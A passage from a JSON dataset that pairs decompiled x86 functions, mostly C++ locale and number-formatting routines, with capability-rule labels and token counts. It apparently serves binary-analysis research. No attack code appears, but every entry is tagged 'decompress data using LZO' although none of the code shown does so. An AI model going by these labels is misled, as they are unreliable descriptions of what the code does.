= uVar5;\n            if (0x3ffffffe < uVar5) goto code_r0x004888c9;\ncode_r0x00488686:\n            var_2ch = fcn.004a34e0(uVar5 * 2);\n            fcn.0042bb20(var_2ch, *(in_ECX + 0x20), 0);\n            iVar7 = *piVar2;\n            if (*(iVar7 + 8) == 0x458a90) {\n                uVar1 = *(piVar2[2] + 0x24);\n            }\n            else {\n                uVar1 = (**(iVar7 + 8))();\n                iVar7 = *piVar2;\n            }\n            *(in_ECX + 0x24) = uVar1;\n            pcVar6 = *(iVar7 + 0xc);\n            if (pcVar6 != 0x458aa0) goto code_r0x004888d0;\n            uVar1 = *(piVar2[2] + 0x26);\n        }\n        else {\n            (**(*piVar2 + 0x18))(piVar2);\n            uVar5 = *(var_1ch + -0xc);\n            *(in_ECX + 0x20) = uVar5;\n            if (uVar5 < 0x3fffffff) goto code_r0x00488686;\ncode_r0x004888c9:\n            pcVar6 = fcn.004a3c30();\ncode_r0x004888d0:\n            uVar1 = (*pcVar6)();\n        }\n        *(in_ECX + 0x26) = uVar1;\n        piVar2 = fcn.004a0ae0(arg_8h);\n        (**(*piVar2 + 0x2c))(*0x4f6d64, *0x4f6d64 + 0x24, in_ECX + 0x28);\n        (**(*piVar2 + 0x2c))(*0x4f6d60, *0x4f6d60 + 0x1a, in_ECX + 0x70);\n        *(in_ECX + 8) = pcVar3;\n        iVar7 = *0x4f59f4;\n        *(in_ECX + 0xa4) = 1;\n        *(in_ECX + 0x14) = uVar4;\n        *(in_ECX + 0x1c) = var_2ch;\n        if (iVar7 == 0) {\n            iVar7 = *(var_1ch + -4);\n            *(var_1ch + -4) = iVar7 + -1;\n        }\n        else {\n            LOCK();\n            piVar2 = var_1ch + -4;\n            iVar7 = *piVar2;\n            *piVar2 = *piVar2 + -1;\n        }\n        if (iVar7 < 1) {\n            fcn.004640a0();\n        }\n        if (*0x4f59f4 == 0) {\n            iVar7 = *(var_20h + -4);\n            *(var_20h + -4) = iVar7 + -1;\n        }\n        else {\n            LOCK();\n            piVar2 = var_20h + -4;\n            iVar7 = *piVar2;\n            *piVar2 = *piVar2 + -1;\n        }\n        if (iVar7 < 1) {\n            fcn.004640a0(&var_25h);\n        }\n        if (*0x4f59f4 == 0) {\n            iVar7 = *(var_24h + -4);\n            *(var_24h + -4) = iVar7 + -1;\n            goto joined_r0x004887a5;\n        }\n    }\n    else {\n        *(in_ECX + 0x10) = *pcVar3 - 1U < 0x7e;\n        pcVar6 = *(*piVar2 + 0x14);\n        if (pcVar6 == 0x4589f0) goto code_r0x004885e6;\ncode_r0x004887cf:\n        (*pcVar6)(piVar2);\n        uVar5 = *(var_20h + -0xc);\n        *(in_ECX + 0x18) = uVar5;\n        if (uVar5 < 0x3fffffff) goto code_r0x00488618;\ncode_r0x004887f3:\n        fcn.004a3c30();\n        var_24h = extraout_ECX;\n    }\n    LOCK();\n    piVar2 = var_24h + -4;\n    iVar7 = *piVar2;\n    *piVar2 = *piVar2 + -1;\njoined_r0x004887a5:\n    if (0 < iVar7) {\n        return;\n    }\n    fcn.0046bf60(&var_25h);\n    return;\n}\n",
        "token_count": 1718
    },
    "00488b90": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00488b90(uint *param_1, uint param_2)\n\n{\n    fcn.0046ff10(param_2);\n    *param_1 = 0x50ae10;\n    return;\n}\n",
        "token_count": 53
    },
    "0048a350": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0048a350(uint arg_8h)\n\n{\n    bool bVar1;\n    uchar uVar2;\n    int32_t *piVar3;\n    char *pcVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    int32_t in_ECX;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uchar var_2ch;\n    uchar var_2bh;\n    uchar var_2ah;\n    uchar var_29h;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint var_ch;\n    \n    piVar3 = fcn.004a0840(arg_8h);\n    if (*(*piVar3 + 8) == 0x42d450) {\n        uVar2 = *(piVar3[2] + 0x11);\n    }\n    else {\n        uVar2 = (**(*piVar3 + 8))();\n    }\n    *(in_ECX + 0x11) = uVar2;\n    if (*(*piVar3 + 0xc) == 0x42d4c0) {\n        uVar2 = *(piVar3[2] + 0x12);\n    }\n    else {\n        uVar2 = (**(*piVar3 + 0xc))();\n    }\n    *(in_ECX + 0x12) = uVar2;\n    if (*(*piVar3 + 0x20) == 0x42d440) {\n        uVar5 = *(piVar3[2] + 0x2c);\n    }\n    else {\n        uVar5 = (**(*piVar3 + 0x20))();\n    }\n    *(in_ECX + 0x2c) = uVar5;\n    if (*(*piVar3 + 0x10) == 0x42d2a0) {\n        fcn.0046d600(*(piVar3[2] + 8), &var_2ch);\n    }\n    else {\n        (**(*piVar3 + 0x10))(piVar3);\n    }\n    uVar5 = *(var_28h + -0xc);\n    *(in_ECX + 0xc) = uVar5;\n    pcVar4 = fcn.004a34e0(uVar5);\n    fcn.0042ca00(pcVar4, *(in_ECX + 0xc), 0);\n    bVar1 = false;\n    if (*(in_ECX + 0xc) != 0) {\n        bVar1 = *pcVar4 - 1U < 0x7e;\n    }\n    *(in_ECX + 0x10) = bVar1;\n    if (*(*piVar3 + 0x14) == 0x42d410) {\n        fcn.0046d600(*(piVar3[2] + 0x14), &var_2bh);\n    }\n    else {\n        (**(*piVar3 + 0x14))(piVar3);\n    }\n    uVar5 = *(var_24h + -0xc);\n    *(in_ECX + 0x18) = uVar5;\n    uVar5 = fcn.004a34e0(uVar5);\n    fcn.0042ca00(uVar5, *(in_ECX + 0x18), 0);\n    if (*(*piVar3 + 0x18) == 0x42d490) {\n        fcn.0046d600(*(piVar3[2] + 0x1c), &var_2ah);\n    }\n    else {\n        (**(*piVar3 + 0x18))(piVar3);\n    }\n    uVar6 = *(var_20h + -0xc);\n    *(in_ECX + 0x20) = uVar6;\n    uVar6 = fcn.004a34e0(uVar6);\n    fcn.0042ca00(uVar6, *(in_ECX + 0x20), 0);\n    if (*(*piVar3 + 0x1c) == 0x42d460) {\n        fcn.0046d600(*(piVar3[2] + 0x24), &var_29h);\n    }\n    else {\n        (**(*piVar3 + 0x1c))(piVar3);\n    }\n    uVar7 = *(var_1ch + -0xc);\n    *(in_ECX + 0x28) = uVar7;\n    uVar7 = fcn.004a34e0(uVar7);\n    fcn.0042ca00(uVar7, *(in_ECX + 0x28), 0);\n    if (*(*piVar3 + 0x24) == 0x42d320) {\n        uVar8 = *(piVar3[2] + 0x30);\n    }\n    else {\n        uVar8 = (**(*piVar3 + 0x24))();\n    }\n    *(in_ECX + 0x30) = uVar8;\n    if (*(*piVar3 + 0x28) == 0x42d310) {\n        uVar8 = *(piVar3[2] + 0x34);\n    }\n    else {\n        uVar8 = (**(*piVar3 + 0x28))();\n    }\n    *(in_ECX + 0x34) = uVar8;\n    fcn.004a0a80(arg_8h);\n    fcn.00431e70(*0x4f6d68, *0x4f6d68 + 0xb, in_ECX + 0x38);\n    *(in_ECX + 0x43) = 1;\n    *(in_ECX + 8) = pcVar4;\n    *(in_ECX + 0x14) = uVar5;\n    *(in_ECX + 0x1c) = uVar6;\n    *(in_ECX + 0x24) = uVar7;\n    fcn.0046bf80(&var_29h);\n    fcn.0046bf80(&var_29h);\n    fcn.0046bf80(&var_29h);\n    fcn.0046bf80(&var_29h);\n    return;\n}\n",
        "token_count": 1445
    },
    "0048aa30": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0048aa30(uint arg_8h)\n\n{\n    bool bVar1;\n    uchar uVar2;\n    int32_t *piVar3;\n    char *pcVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    int32_t in_ECX;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uchar var_2ch;\n    uchar var_2bh;\n    uchar var_2ah;\n    uchar var_29h;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint var_ch;\n    \n    piVar3 = fcn.004a08a0(arg_8h);\n    if (*(*piVar3 + 8) == 0x42d780) {\n        uVar2 = *(piVar3[2] + 0x11);\n    }\n    else {\n        uVar2 = (**(*piVar3 + 8))();\n    }\n    *(in_ECX + 0x11) = uVar2;\n    if (*(*piVar3 + 0xc) == 0x42d7f0) {\n        uVar2 = *(piVar3[2] + 0x12);\n    }\n    else {\n        uVar2 = (**(*piVar3 + 0xc))();\n    }\n    *(in_ECX + 0x12) = uVar2;\n    if (*(*piVar3 + 0x20) == 0x42d770) {\n        uVar5 = *(piVar3[2] + 0x2c);\n    }\n    else {\n        uVar5 = (**(*piVar3 + 0x20))();\n    }\n    *(in_ECX + 0x2c) = uVar5;\n    if (*(*piVar3 + 0x10) == 0x42d5d0) {\n        fcn.0046d600(*(piVar3[2] + 8), &var_2ch);\n    }\n    else {\n        (**(*piVar3 + 0x10))(piVar3);\n    }\n    uVar5 = *(var_28h + -0xc);\n    *(in_ECX + 0xc) = uVar5;\n    pcVar4 = fcn.004a34e0(uVar5);\n    fcn.0042ca00(pcVar4, *(in_ECX + 0xc), 0);\n    bVar1 = false;\n    if (*(in_ECX + 0xc) != 0) {\n        bVar1 = *pcVar4 - 1U < 0x7e;\n    }\n    *(in_ECX + 0x10) = bVar1;\n    if (*(*piVar3 + 0x14) == 0x42d740) {\n        fcn.0046d600(*(piVar3[2] + 0x14), &var_2bh);\n    }\n    else {\n        (**(*piVar3 + 0x14))(piVar3);\n    }\n    uVar5 = *(var_24h + -0xc);\n    *(in_ECX + 0x18) = uVar5;\n    uVar5 = fcn.004a34e0(uVar5);\n    fcn.0042ca00(uVar5, *(in_ECX + 0x18), 0);\n    if (*(*piVar3 + 0x18) == 0x42d7c0) {\n        fcn.0046d600(*(piVar3[2] + 0x1c), &var_2ah);\n    }\n    else {\n        (**(*piVar3 + 0x18))(piVar3);\n    }\n    uVar6 = *(var_20h + -0xc);\n    *(in_ECX + 0x20) = uVar6;\n    uVar6 = fcn.004a34e0(uVar6);\n    fcn.0042ca00(uVar6, *(in_ECX + 0x20), 0);\n    if (*(*piVar3 + 0x1c) == 0x42d790) {\n        fcn.0046d600(*(piVar3[2] + 0x24), &var_29h);\n    }\n    else {\n        (**(*piVar3 + 0x1c))(piVar3);\n    }\n    uVar7 = *(var_1ch + -0xc);\n    *(in_ECX + 0x28) = uVar7;\n    uVar7 = fcn.004a34e0(uVar7);\n    fcn.0042ca00(uVar7, *(in_ECX + 0x28), 0);\n    if (*(*piVar3 + 0x24) == 0x42d650) {\n        uVar8 = *(piVar3[2] + 0x30);\n    }\n    else {\n        uVar8 = (**(*piVar3 + 0x24))();\n    }\n    *(in_ECX + 0x30) = uVar8;\n    if (*(*piVar3 + 0x28) == 0x42d640) {\n        uVar8 = *(piVar3[2] + 0x34);\n    }\n    else {\n        uVar8 = (**(*piVar3 + 0x28))();\n    }\n    *(in_ECX + 0x34) = uVar8;\n    fcn.004a0a80(arg_8h);\n    fcn.00431e70(*0x4f6d68, *0x4f6d68 + 0xb, in_ECX + 0x38);\n    *(in_ECX + 0x43) = 1;\n    *(in_ECX + 8) = pcVar4;\n    *(in_ECX + 0x14) = uVar5;\n    *(in_ECX + 0x1c) = uVar6;\n    *(in_ECX + 0x24) = uVar7;\n    fcn.0046bf80(&var_29h);\n    fcn.0046bf80(&var_29h);\n    fcn.0046bf80(&var_29h);\n    fcn.0046bf80(&var_29h);\n    return;\n}\n",
        "token_count": 1448
    },
    "0048b110": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0048b110(uint arg_8h)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    ushort uVar3;\n    int32_t *piVar4;\n    uint8_t *puVar5;\n    uint32_t uVar6;\n    uint uVar7;\n    code *pcVar8;\n    int32_t in_ECX;\n    uint *puVar9;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint32_t var_40h;\n    uint var_3ch;\n    uchar var_2ch;\n    uchar var_2bh [2];\n    uchar var_29h;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint var_ch;\n    \n    piVar4 = fcn.004a0900(arg_8h);\n    if (*(*piVar4 + 8) == 0x42dab0) {\n        *(in_ECX + 0x12) = *(piVar4[2] + 0x12);\n        pcVar8 = *(*piVar4 + 0xc);\n        if (pcVar8 != 0x42db20) goto code_r0x0048b4c8;\ncode_r0x0048b153:\n        *(in_ECX + 0x14) = *(piVar4[2] + 0x14);\n        pcVar8 = *(*piVar4 + 0x20);\n        if (pcVar8 != 0x42daa0) goto code_r0x0048b4e0;\ncode_r0x0048b16e:\n        uVar7 = *(piVar4[2] + 0x30);\n    }\n    else {\n        uVar3 = (**(*piVar4 + 8))();\n        *(in_ECX + 0x12) = uVar3;\n        pcVar8 = *(*piVar4 + 0xc);\n        if (pcVar8 == 0x42db20) goto code_r0x0048b153;\ncode_r0x0048b4c8:\n        uVar3 = (*pcVar8)();\n        *(in_ECX + 0x14) = uVar3;\n        pcVar8 = *(*piVar4 + 0x20);\n        if (pcVar8 == 0x42daa0) goto code_r0x0048b16e;\ncode_r0x0048b4e0:\n        uVar7 = (*pcVar8)();\n    }\n    *(in_ECX + 0x30) = uVar7;\n    if (*(*piVar4 + 0x10) == 0x42d900) {\n        fcn.0046d600(*(piVar4[2] + 8), &var_2ch);\n    }\n    else {\n        (**(*piVar4 + 0x10))(piVar4);\n    }\n    uVar7 = *(var_28h + -0xc);\n    *(in_ECX + 0xc) = uVar7;\n    puVar5 = fcn.004a34e0(uVar7);\n    fcn.0042ca00(puVar5, *(in_ECX + 0xc), 0);\n    bVar2 = false;\n    if (*(in_ECX + 0xc) != 0) {\n        var_40h = var_40h & 0xffffff00 | *puVar5;\n        bVar2 = *puVar5 - 1 < 0x7e;\n    }\n    *(in_ECX + 0x10) = bVar2;\n    if (*(*piVar4 + 0x14) == 0x42da70) {\n        fcn.00465870(*(piVar4[2] + 0x18), var_2bh);\n        uVar6 = *(var_24h + -0xc);\n        *(in_ECX + 0x1c) = uVar6;\n        if (0x3ffffffe < uVar6) goto code_r0x0048b51e;\ncode_r0x0048b227:\n        var_48h = fcn.004a34e0(uVar6 * 2);\n        fcn.0042bb20(var_48h, *(in_ECX + 0x1c), 0);\n        pcVar8 = *(*piVar4 + 0x18);\n        if (pcVar8 != 0x42daf0) goto code_r0x0048b523;\n        fcn.00465870();\n        uVar6 = *(var_20h + -0xc);\n        *(in_ECX + 0x24) = uVar6;\n        if (uVar6 < 0x3fffffff) goto code_r0x0048b293;\ncode_r0x0048b544:\n        puVar9 = &var_20h;\n        pcVar8 = fcn.004a3c30();\n    }\n    else {\n        (**(*piVar4 + 0x14))(piVar4);\n        uVar6 = *(var_24h + -0xc);\n        *(in_ECX + 0x1c) = uVar6;\n        if (uVar6 < 0x3fffffff) goto code_r0x0048b227;\ncode_r0x0048b51e:\n        pcVar8 = fcn.004a3c30();\ncode_r0x0048b523:\n        (*pcVar8)(piVar4);\n        uVar6 = *(var_20h + -0xc);\n        *(in_ECX + 0x24) = uVar6;\n        if (0x3ffffffe < uVar6) goto code_r0x0048b544;\ncode_r0x0048b293:\n        var_44h = fcn.004a34e0(uVar6 * 2);\n        fcn.0042bb20(var_44h, *(in_ECX + 0x24), 0);\n        if (*(*piVar4 + 0x1c) == 0x42dac0) {\n            fcn.00465870(*(piVar4[2] + 0x28), &var_29h);\n            uVar6 = *(var_1ch + -0xc);\n            *(in_ECX + 0x2c) = uVar6;\n            if (0x3ffffffe < uVar6) goto code_r0x0048b587;\ncode_r0x0048b300:\n            var_40h = fcn.004a34e0(uVar6 * 2);\n            fcn.0042bb20(var_40h, *(in_ECX + 0x2c), 0);\n            pcVar8 = *(*piVar4 + 0x24);\n            if (pcVar8 != 0x42d980) goto code_r0x0048b590;\n            uVar7 = *(piVar4[2] + 0x34);\n        }\n        else {\n            (**(*piVar4 + 0x1c))(piVar4);\n            uVar6 = *(var_1ch + -0xc);\n            *(in_ECX + 0x2c) = uVar6;\n            if (uVar6 < 0x3fffffff) goto code_r0x0048b300;\ncode_r0x0048b587:\n            pcVar8 = fcn.004a3c30();\ncode_r0x0048b590:\n            uVar7 = (*pcVar8)();\n        }\n        puVar9 = &var_29h;\n        *(in_ECX + 0x34) = uVar7;\n        pcVar8 = *(*piVar4 + 0x28);\n        if (pcVar8 == 0x42d970) {\n            uVar7 = *(piVar4[2] + 0x38);\n            goto code_r0x0048b35b;\n        }\n    }\n    uVar7 = (*pcVar8)();\ncode_r0x0048b35b:\n    *(in_ECX + 0x38) = uVar7;\n    piVar4 = fcn.004a0ae0(arg_8h);\n    (**(*piVar4 + 0x2c))(*0x4f6d68, *0x4f6d68 + 0xb, in_ECX + 0x3c);\n    *(in_ECX + 0x52) = 1;\n    *(in_ECX + 8) = puVar5;\n    *(in_ECX + 0x18) = var_48h;\n    *(in_ECX + 0x20) = var_44h;\n    *(in_ECX + 0x28) = var_40h;\n    if (*0x4f59f4 == 0) {\n        iVar1 = *(var_1ch + -4);\n        *(var_1ch + -4) = iVar1 + -1;\n    }\n    else {\n        LOCK();\n        piVar4 = var_1ch + -4;\n        iVar1 = *piVar4;\n        *piVar4 = *piVar4 + -1;\n    }\n    if (iVar1 < 1) {\n        fcn.004640a0(puVar9);\n    }\n    if (*0x4f59f4 == 0) {\n        iVar1 = *(var_20h + -4);\n        *(var_20h + -4) = iVar1 + -1;\n    }\n    else {\n        LOCK();\n        piVar4 = var_20h + -4;\n        iVar1 = *piVar4;\n        *piVar4 = *piVar4 + -1;\n    }\n    if (iVar1 < 1) {\n        fcn.004640a0(puVar9);\n    }\n    if (*0x4f59f4 == 0) {\n        iVar1 = *(var_24h + -4);\n        *(var_24h + -4) = iVar1 + -1;\n    }\n    else {\n        LOCK();\n        piVar4 = var_24h + -4;\n        iVar1 = *piVar4;\n        *piVar4 = *piVar4 + -1;\n    }\n    if (iVar1 < 1) {\n        fcn.004640a0(puVar9);\n    }\n    fcn.0046bf80(puVar9);\n    return;\n}\n",
        "token_count": 2326
    },
    "0048b930": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0048b930(uint arg_8h)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    ushort uVar3;\n    int32_t *piVar4;\n    uint8_t *puVar5;\n    uint32_t uVar6;\n    uint uVar7;\n    code *pcVar8;\n    int32_t in_ECX;\n    uint *puVar9;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint32_t var_40h;\n    uint var_3ch;\n    uchar var_2ch;\n    uchar var_2bh [2];\n    uchar var_29h;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint var_ch;\n    \n    piVar4 = fcn.004a0960(arg_8h);\n    if (*(*piVar4 + 8) == 0x42dde0) {\n        *(in_ECX + 0x12) = *(piVar4[2] + 0x12);\n        pcVar8 = *(*piVar4 + 0xc);\n        if (pcVar8 != 0x42de50) goto code_r0x0048bce8;\ncode_r0x0048b973:\n        *(in_ECX + 0x14) = *(piVar4[2] + 0x14);\n        pcVar8 = *(*piVar4 + 0x20);\n        if (pcVar8 != 0x42ddd0) goto code_r0x0048bd00;\ncode_r0x0048b98e:\n        uVar7 = *(piVar4[2] + 0x30);\n    }\n    else {\n        uVar3 = (**(*piVar4 + 8))();\n        *(in_ECX + 0x12) = uVar3;\n        pcVar8 = *(*piVar4 + 0xc);\n        if (pcVar8 == 0x42de50) goto code_r0x0048b973;\ncode_r0x0048bce8:\n        uVar3 = (*pcVar8)();\n        *(in_ECX + 0x14) = uVar3;\n        pcVar8 = *(*piVar4 + 0x20);\n        if (pcVar8 == 0x42ddd0) goto code_r0x0048b98e;\ncode_r0x0048bd00:\n        uVar7 = (*pcVar8)();\n    }\n    *(in_ECX + 0x30) = uVar7;\n    if (*(*piVar4 + 0x10) == 0x42dc30) {\n        fcn.0046d600(*(piVar4[2] + 8), &var_2ch);\n    }\n    else {\n        (**(*piVar4 + 0x10))(piVar4);\n    }\n    uVar7 = *(var_28h + -0xc);\n    *(in_ECX + 0xc) = uVar7;\n    puVar5 = fcn.004a34e0(uVar7);\n    fcn.0042ca00(puVar5, *(in_ECX + 0xc), 0);\n    bVar2 = false;\n    if (*(in_ECX + 0xc) != 0) {\n        var_40h = var_40h & 0xffffff00 | *puVar5;\n        bVar2 = *puVar5 - 1 < 0x7e;\n    }\n    *(in_ECX + 0x10) = bVar2;\n    if (*(*piVar4 + 0x14) == 0x42dda0) {\n        fcn.00465870(*(piVar4[2] + 0x18), var_2bh);\n        uVar6 = *(var_24h + -0xc);\n        *(in_ECX + 0x1c) = uVar6;\n        if (0x3ffffffe < uVar6) goto code_r0x0048bd3e;\ncode_r0x0048ba47:\n        var_48h = fcn.004a34e0(uVar6 * 2);\n        fcn.0042bb20(var_48h, *(in_ECX + 0x1c), 0);\n        pcVar8 = *(*piVar4 + 0x18);\n        if (pcVar8 != 0x42de20) goto code_r0x0048bd43;\n        fcn.00465870();\n        uVar6 = *(var_20h + -0xc);\n        *(in_ECX + 0x24) = uVar6;\n        if (uVar6 < 0x3fffffff) goto code_r0x0048bab3;\ncode_r0x0048bd64:\n        puVar9 = &var_20h;\n        pcVar8 = fcn.004a3c30();\n    }\n    else {\n        (**(*piVar4 + 0x14))(piVar4);\n        uVar6 = *(var_24h + -0xc);\n        *(in_ECX + 0x1c) = uVar6;\n        if (uVar6 < 0x3fffffff) goto code_r0x0048ba47;\ncode_r0x0048bd3e:\n        pcVar8 = fcn.004a3c30();\ncode_r0x0048bd43:\n        (*pcVar8)(piVar4);\n        uVar6 = *(var_20h + -0xc);\n        *(in_ECX + 0x24) = uVar6;\n        if (0x3ffffffe < uVar6) goto code_r0x0048bd64;\ncode_r0x0048bab3:\n        var_44h = fcn.004a34e0(uVar6 * 2);\n        fcn.0042bb20(var_44h, *(in_ECX + 0x24), 0);\n        if (*(*piVar4 + 0x1c) == 0x42ddf0) {\n            fcn.00465870(*(piVar4[2] + 0x28), &var_29h);\n            uVar6 = *(var_1ch + -0xc);\n            *(in_ECX + 0x2c) = uVar6;\n            if (0x3ffffffe < uVar6) goto code_r0x0048bda7;\ncode_r0x0048bb20:\n            var_40h = fcn.004a34e0(uVar6 * 2);\n            fcn.0042bb20(var_40h, *(in_ECX + 0x2c), 0);\n            pcVar8 = *(*piVar4 + 0x24);\n            if (pcVar8 != 0x42dcb0) goto code_r0x0048bdb0;\n            uVar7 = *(piVar4[2] + 0x34);\n        }\n        else {\n            (**(*piVar4 + 0x1c))(piVar4);\n            uVar6 = *(var_1ch + -0xc);\n            *(in_ECX + 0x2c) = uVar6;\n            if (uVar6 < 0x3fffffff) goto code_r0x0048bb20;\ncode_r0x0048bda7:\n            pcVar8 = fcn.004a3c30();\ncode_r0x0048bdb0:\n            uVar7 = (*pcVar8)();\n        }\n        puVar9 = &var_29h;\n        *(in_ECX + 0x34) = uVar7;\n        pcVar8 = *(*piVar4 + 0x28);\n        if (pcVar8 == 0x42dca0) {\n            uVar7 = *(piVar4[2] + 0x38);\n            goto code_r0x0048bb7b;\n        }\n    }\n    uVar7 = (*pcVar8)();\ncode_r0x0048bb7b:\n    *(in_ECX + 0x38) = uVar7;\n    piVar4 = fcn.004a0ae0(arg_8h);\n    (**(*piVar4 + 0x2c))(*0x4f6d68, *0x4f6d68 + 0xb, in_ECX + 0x3c);\n    *(in_ECX + 0x52) = 1;\n    *(in_ECX + 8) = puVar5;\n    *(in_ECX + 0x18) = var_48h;\n    *(in_ECX + 0x20) = var_44h;\n    *(in_ECX + 0x28) = var_40h;\n    if (*0x4f59f4 == 0) {\n        iVar1 = *(var_1ch + -4);\n        *(var_1ch + -4) = iVar1 + -1;\n    }\n    else {\n        LOCK();\n        piVar4 = var_1ch + -4;\n        iVar1 = *piVar4;\n        *piVar4 = *piVar4 + -1;\n    }\n    if (iVar1 < 1) {\n        fcn.004640a0(puVar9);\n    }\n    if (*0x4f59f4 == 0) {\n        iVar1 = *(var_20h + -4);\n        *(var_20h + -4) = iVar1 + -1;\n    }\n    else {\n        LOCK();\n        piVar4 = var_20h + -4;\n        iVar1 = *piVar4;\n        *piVar4 = *piVar4 + -1;\n    }\n    if (iVar1 < 1) {\n        fcn.004640a0(puVar9);\n    }\n    if (*0x4f59f4 == 0) {\n        iVar1 = *(var_24h + -4);\n        *(var_24h + -4) = iVar1 + -1;\n    }\n    else {\n        LOCK();\n        piVar4 = var_24h + -4;\n        iVar1 = *piVar4;\n        *piVar4 = *piVar4 + -1;\n    }\n    if (iVar1 < 1) {\n        fcn.004640a0(puVar9);\n    }\n    fcn.0046bf80(puVar9);\n    return;\n}\n",
        "token_count": 2321
    },
    "0048c3b0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0048c3b0(int32_t param_1, char param_2, char *param_3, char *param_4, int32_t param_5, int32_t param_6)\n\n{\n    char cVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    int32_t *piVar5;\n    char *pcVar6;\n    char *in_stack_ffffffcc;\n    int32_t iStack48;\n    \n    piVar5 = param_2;\n    param_5 = param_5 - param_6;\n    uVar3 = *(param_1 + 0xc) & 0xb0;\n    if (uVar3 == 0x20) {\n        if (param_6 != 0) {\n            sub.msvcrt.dll_memcpy(param_3, param_4, param_6);\n        }\n        if (param_5 == 0) {\n            return;\n        }\n    // WARNING: Could not recover jumptable at 0x004278a0. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*_sym.imp.msvcrt.dll_memset)();\n        return;\n    }\n    if (uVar3 == 0x10) {\n        piVar4 = fcn.004a0a80(param_1 + 0x6c);\n        if (*(piVar4 + 7) == '\\0') {\n            fcn.00431cc0();\n            cVar2 = '-';\n            if (*(*piVar4 + 0x18) != 0x431f70) {\n                cVar2 = (**(*piVar4 + 0x18))(0x2d);\n            }\n            cVar1 = *param_4;\n            if (cVar1 != cVar2) {\n                if (*(piVar4 + 7) != '\\0') goto code_r0x0048c4df;\n                fcn.00431cc0();\n                cVar2 = '+';\n                if (*(*piVar4 + 0x18) != 0x431f70) {\n                    cVar2 = (**(*piVar4 + 0x18))(0x2b);\n                }\n                cVar1 = *param_4;\n                if (cVar1 != cVar2) {\n                    if (*(piVar4 + 7) != '\\0') goto code_r0x0048c410;\n                    fcn.00431cc0();\n                    cVar2 = '0';\n                    if (*(*piVar4 + 0x18) != 0x431f70) {\n                        cVar2 = (**(*piVar4 + 0x18))(0x30);\n                    }\n                    if ((*param_4 != cVar2) || (param_6 < 2)) goto code_r0x0048c3f6;\n                    if (*(piVar4 + 7) != '\\0') goto code_r0x0048c41a;\n                    cVar1 = fcn.00431ef0(0x78);\n                    cVar2 = *(iStack48 + 1);\n                    if (cVar2 != cVar1) {\n                        if (*(piVar5 + 7) != '\\0') goto code_r0x0048c42e;\n                        cVar1 = fcn.00431ef0(0x58);\n                        cVar2 = in_stack_ffffffcc[1];\n                        goto code_r0x0048c432;\n                    }\n                    goto code_r0x0048c65f;\n                }\n            }\ncode_r0x0048c4e8:\n            *param_3 = cVar2;\n            param_6 = param_6 + -1;\n            param_3 = param_3 + 1;\n            goto code_r0x0048c3f6;\n        }\n        cVar1 = *param_4;\n        cVar2 = cVar1;\n        if (*(piVar4 + 0x4a) == cVar1) goto code_r0x0048c4e8;\ncode_r0x0048c4df:\n        cVar2 = cVar1;\n        if (*(piVar4 + 0x12) == cVar1) goto code_r0x0048c4e8;\ncode_r0x0048c410:\n        if ((*(piVar4 + 0x4d) != cVar1) || (param_6 < 2)) goto code_r0x0048c3f6;\ncode_r0x0048c41a:\n        cVar2 = param_4[1];\n        piVar5 = piVar4;\n        if (cVar2 == *(piVar4 + 0x95)) {\ncode_r0x0048c65f:\n            param_6 = param_6 + -2;\n            *param_3 = *in_stack_ffffffcc;\n            param_3[1] = in_stack_ffffffcc[1];\n            param_3 = param_3 + 2;\n            goto code_r0x0048c3f6;\n        }\ncode_r0x0048c42e:\n        cVar1 = *(piVar5 + 0x75);\ncode_r0x0048c432:\n        if (cVar1 == cVar2) goto code_r0x0048c65f;\n        pcVar6 = param_3 + param_5;\n        if (param_5 == 0) goto code_r0x004278b0;\ncode_r0x0048c441:\n        sub.msvcrt.dll_memset(param_3, iStack48, param_5);\n    }\n    else {\ncode_r0x0048c3f6:\n        pcVar6 = param_3 + param_5;\n        if (param_5 != 0) goto code_r0x0048c441;\n    }\n    if (param_6 == 0) {\n        return;\n    }\ncode_r0x004278b0:\n    // WARNING: Could not recover jumptable at 0x004278b0. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.msvcrt.dll_memcpy)(pcVar6);\n    return;\n}\n",
        "token_count": 1355
    },
    "0048c6b0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
